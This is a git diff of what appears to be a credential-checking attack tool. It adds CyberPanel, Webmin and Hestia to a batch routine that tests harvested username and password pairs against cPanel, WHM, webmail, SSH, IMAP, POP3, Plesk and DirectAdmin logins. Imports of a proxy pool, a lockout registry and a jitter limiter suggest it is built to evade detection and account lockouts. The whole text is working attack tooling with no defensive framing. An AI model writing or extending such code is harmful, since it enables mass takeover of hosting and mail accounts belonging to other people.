@@ -26,7 +26,7 @@ import { verifyCpanel } from '../core/cpanel.js';
 import { verifyWebmail } from '../core/webmail.js';
 import { verifyWhm } from '../core/whm.js';
 import { verifyImap, verifyPop3 } from '../core/mail-extra.js';
-import { verifyPlesk, verifyDirectAdmin } from '../core/panels-extra.js';
+import { verifyPlesk, verifyDirectAdmin, verifyCyberPanel, verifyWebmin, verifyHestia } from '../core/panels-extra.js';
 import { ProxyPool } from '../core/proxy_pool.js';
 import { LockoutRegistry } from '../core/lockout.js';
 import { rateLimiter } from '../core/jitter.js';
@@ -619,7 +619,7 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
               const safe = async (fn, label) => {
                 try { return await fn(); } catch (e) { return { error: label + ': ' + (e.message || String(e)) }; }
               };
-              const [cp, wm, whm, ssh, imapR, pop3R, pleskR, daR] = await Promise.all([
+              const [cp, wm, whm, ssh, imapR, pop3R, pleskR, daR, cyber, webmin, hestia] = await Promise.all([
                 safe(() => runCpanelChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2083, 2082, 8443] }).then(r => r[0]), 'cpanel'),
                 safe(() => runWebmailChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [443, 2096, 2095] }).then(r => r[0]), 'webmail'),
                 safe(() => runWhmChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2087, 2086, 8443] }).then(r => r[0]), 'whm'),
@@ -627,10 +627,13 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
                 safe(() => verifyImap({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'imap'),
                 safe(() => verifyPop3({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'pop3'),
                 safe(() => verifyPlesk({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'plesk'),
-                safe(() => verifyDirectAdmin({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'directadmin')
+                safe(() => verifyDirectAdmin({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'directadmin'),
+                safe(() => verifyCyberPanel({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000 }), 'cyberpanel'),
+                safe(() => verifyWebmin({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000 }), 'webmin'),
+                safe(() => verifyHestia({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000 }), 'hestia')
               ]);
               if (currentAbort?.signal.aborted) return;
-              result.panels = { cpanel: cp, webmail: wm, whm, ssh, imap: imapR, pop3: pop3R, plesk: pleskR, directadmin: daR };
+              result.panels = { cpanel: cp, webmail: wm, whm, ssh, imap: imapR, pop3: pop3R, plesk: pleskR, directadmin: daR, cyberpanel: cyber, webmin, hestia };
             }
           }
         } catch (panelErr) {
